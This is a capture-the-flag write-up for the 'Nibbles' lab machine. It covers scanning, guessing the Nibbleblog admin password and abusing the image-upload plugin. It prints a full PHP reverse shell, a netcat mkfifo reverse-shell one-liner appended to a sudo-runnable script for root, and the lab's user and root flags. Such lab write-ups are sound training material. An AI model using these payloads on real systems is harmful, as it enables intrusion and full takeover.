# Nibbles

## Port Enumeration

To find all opening ports, we can first use rustscan to scan all ports

```bash
└─$ rustscan -a xx.xxx.xxx.xx --ulimit 5000 --range 1-65535
.
.
.
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We can then check their version and run some scripts for more info

```bash
└─$ nmap -sV -sC xx.xxx.xxx.xx -p22,80
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-29 01:43 -0500
Nmap scan report for xx.xxx.xxx.xx
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds
```

We can then determine that the server is running Apache version `2.4.18`. However, to obtain more details, we would like to access port 80 first, and we see only 

> ‘Hello world!’
> 

However, if we look at the source code, we can see there is a hidden comment

![image.png](Nibbles/image.png)

We can then navigate to `/nibbleblog/` and take a look, which brings us to an empty blog page

![image.png](Nibbles/image%201.png)

However there is only emptiness here. To find more details, we need to enumerate the endpoints

```bash
└─$ ffuf -u http://xx.xxx.xxx.xx/nibbleblog/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xxx.xxx.xx/nibbleblog/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 225ms]
                        [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 236ms]
.htaccess               [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 2752ms]
admin                   [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 222ms]
admin.php               [Status: 200, Size: 1401, Words: 79, Lines: 27, Duration: 250ms]
.hta                    [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 4771ms]
content                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 222ms]
index.php               [Status: 200, Size: 2987, Words: 116, Lines: 61, Duration: 231ms]
languages               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 222ms]
plugins                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 222ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 226ms]
themes                  [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 222ms]
:: Progress: [4614/4614] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:28] :: Errors: 0 ::

```

We can find so many endpoints, however we should take a look at README first

```bash
└─$ curl http://xx.xxx.xxx.xx/nibbleblog/README                                                                                                                                                                                            
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

Optionals requirements

* PHP module - Mcrypt

===== Installation guide =====
1- Download the last version from http://nibbleblog.com
2- Unzip the downloaded file
3- Upload all files to your hosting or local server via FTP, Shell, Cpanel, others.
4- With your browser, go to the URL of your web. Example: www.domain-name.com
5- Complete the form
6- Done! you have installed Nibbleblog

```

If we try to search for exploits, we can find that there is only a file upload exploit, but we want to find the SSH credentials, which does not help much

```bash
└─$ searchsploit Nibbleblog
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                                                                  | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                                                   | php/remote/38489.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We can then access to `admin.php`. It is just an ordinary login pages, the credentials are not hiding in  the source code, so guess we need to find them on our own

![image.png](Nibbles/image%202.png)

How about `content`? we can take a look, and we can see there are three directory in total, which looks promising

![image.png](Nibbles/c8843f3c-866f-4bc3-8171-2ba7028f421e.png)

If we navigate to the `private` directory, we can see there are many xml files

![image.png](Nibbles/9d1c5007-7290-4f14-b38c-c769191872b2.png)

The `users.xml` file first caught my attention, so I immediately open it, and we can confirm that the user `admin` is indeed existing.

![image.png](Nibbles/image%203.png)

How about `config.xml`? It might seems that it does not reveal the password at first

![image.png](Nibbles/image%204.png)

So what I did is I read all the files, and I can’t still can’t find the password. So after a while, I realize what if the password is the same as the challenge name (I took too long to realize).

Using the credentials `admin:nibbles`, we can login as admin

![image.png](Nibbles/f20e531b-0fd7-4b6c-b9d0-05671996ee55.png)

We can then navigate around and see is there any vulnerabilities we can exploit. After a while, I found that there is a plugin called my image which seems to be very promising

![image.png](Nibbles/image%205.png)

We can try to upload a php file with `<?php system('id')?>`, and see if we can see the results.

Despite the errors, the file is successfully uploaded

![image.png](Nibbles/image%206.png)

But where is the result? To find it, we need to go back to the `private` directory, inside there lies an image.php

![image.png](Nibbles/image%207.png)

Open it and we saw

> uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
> 

That’s means that it do not check whether it is a image file or not. Therefore we can try to use a reverse shell to connect to the server

The below payload are generated using [Revshell.com](https://www.revshells.com/)

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'xx.xx.xx.xx';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>

```

Then we use `nc -lvnp 9001` to keep listening on port 9001. And we can find user.txt under `/home/nibbler`

```bash
$ cd /home            
$ ls
nibbler
$ cd nibbler
$ ls
personal.zip
user.txt
$ cat user.txt  
79c03865431abf47b90ef24b9695e148
```

User Flag: `79c03865431abf47b90ef24b9695e148`

We can then use `sudo -l` to check what commands we can run with sudo

```php
 sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

There is a bash file we can run with sudo. which is included in the zip file under the nibbler directory. We can first unzip and take a look at its content

```php
$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  

$ cat personal/stuff/monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{

# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))

```

Because we also write access, we can append a reverse shell command inside the bash file.

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 8443 >/tmp/f' | tee -a monitor.sh
```

use `nc -lvnp 8443` to listen on port 8443, then we can use the reverse shell to get flag

```bash
# whoami
root
# sudo cat /root/root.txt
de5e5d6619862a8aa5b9b212314e0cdd
```

Root Flag: `de5e5d6619862a8aa5b9b212314e0cdd`